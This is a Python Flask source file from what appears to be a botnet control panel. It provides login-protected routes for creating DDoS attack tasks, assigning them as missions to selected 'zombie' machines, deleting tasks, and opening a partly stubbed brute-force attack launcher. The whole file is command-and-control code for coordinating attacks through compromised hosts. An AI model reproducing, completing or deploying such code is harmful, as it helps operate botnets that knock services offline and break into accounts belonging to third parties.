#!/usr/bin/env python
# -*- coding: utf-8 -*-
# r3nt0n


from flask import Blueprint, current_app, render_template, request
from app.forms import CreateDDosAttackForm, CreateBruteAttackForm
from app.models import Task, Mission
from app.modules.crud import delete_data

attacks_bp = Blueprint('attacks_bp', __name__)


from app import logger, zession
from app.models.task import DDosAttack, BruteForceAttack
from app.models.mission import Mission

from app.modules.crud import read_data, create_data

from app.modules.data_filter import DataFilter

from .custom_decorators import login_required



class AttackController:
    def __init__(self, form):
        self.form = form
        self.error = None
        self.created = []
        # get zombies data
        self.zombies_data = {}
        zombies_filter = DataFilter('zombies')
        zombies_filter.run(request)
        if zombies_filter.data:
            self.zombies_data = zombies_filter.data

    def run(self, request, data_type):

        # create new attack
        if (request.method == 'POST') and ('create_btn' in request.form):
            if self.form.validate_on_submit():
                logger.log('creating attack', 'WARNING')
                task = DDosAttack()
                mission = Mission()

                if task.create(request.form.to_dict()):
                    mission.task_id = task.id
                    logger.log('task created', 'WARNING')

                    selected_zombies = request.form.getlist('zombies_checked')
                    for zombie in selected_zombies:
                        mission.zombie_username = zombie
                        if mission.create():
                            self.created.append(zombie)
                            logger.log('mission for {} created'.format(zombie), 'SUCCESS')

        logger.log('create_attack.created: {}'.format(self.created), 'WARNING')


@attacks_bp.route('/attacks/', methods=['GET', 'POST'])
@login_required
def attacks():
    zession.current_section = 'tools'
    data_type = 'tasks'
    attacks_deleted = []

    # filter data
    data_filter = DataFilter(data_type)
    if ('filter_btn' in request.form) or ('btn-delete-tasks' in request.form):
        data_filter.run(request)

    # delete tasks
    if (request.method == 'POST') and ('btn-delete-tasks' in request.form):
        selected_tasks = request.form.getlist('tasks_checked')
        for id in selected_tasks:
            if delete_data('task', id):
                attacks_deleted.append(id)

    return render_template("pages/dashboard/tools/attacks.html",
                           zession=zession, data_filter=data_filter, attacks_deleted=attacks_deleted)


@attacks_bp.route('/ddos-attacks/', methods=['GET', 'POST'])
@login_required
def ddos_attacks():
    zession.current_section = 'tools'
    data_type = 'tasks'
    task_type = 'ddos_attacks'
    form = CreateDDosAttackForm()
    create_attack = AttackController(form)
    attacks_deleted = []

    # filter data
    data_filter = DataFilter(task_type)
    if ('filter_btn' in request.form) or ('btn-delete-tasks' in request.form):
        data_filter.run(request)

    # delete tasks
    if (request.method == 'POST') and ('btn-delete-tasks' in request.form):
        selected_tasks = request.form.getlist('tasks_checked')
        for id in selected_tasks:
            if delete_data('task', id):
                attacks_deleted.append(id)

    # create attack
    elif (request.method == 'POST') and ('create_btn' in request.form):
        create_attack.run(request, data_type)

    return render_template("pages/dashboard/tools/ddos-attacks.html",
                           zession=zession, data_filter=data_filter, create_attack=create_attack, task_type=task_type,
                           attacks_deleted=attacks_deleted)



@attacks_bp.route('/brute-attacks/', methods=['GET', 'POST'])
@login_required
def brute_attacks():
    zession.current_section = 'tools'
    data_type = 'brute_attacks'
    filter_error = create_error = None
    create_attack = False

    # filter data
    data_filter = DataFilter(data_type)
    if ('filter_btn' in request.form):
        data_filter.run(request)

    # launch attack creator
    create_attack_form = CreateBruteAttackForm()
    if (request.method == 'POST') and ('btn-launcher' in request.form):
        zombies_data = read_data('zombies')
        create_attack = True

    # create new attack
    if (request.method == 'POST') and ('btn-ddos-creator' in request.form):
        print(request.form)
        pass
        # ...
        # data = get_filtered_data_by_input(request, 'zombies')
        # return render_template("pages/dashboard/tools/ddos-creator.html", zession=zession, create_error=error, data=data)

    return render_template("pages/dashboard/tools/brute-attacks.html",
                           zession=zession, filter_form=data_filter.form, filter_error=data_filter.error,
                           data=data_filter.data, create_error=create_error, create_attack=create_attack,
                           create_attack_form=create_attack_form)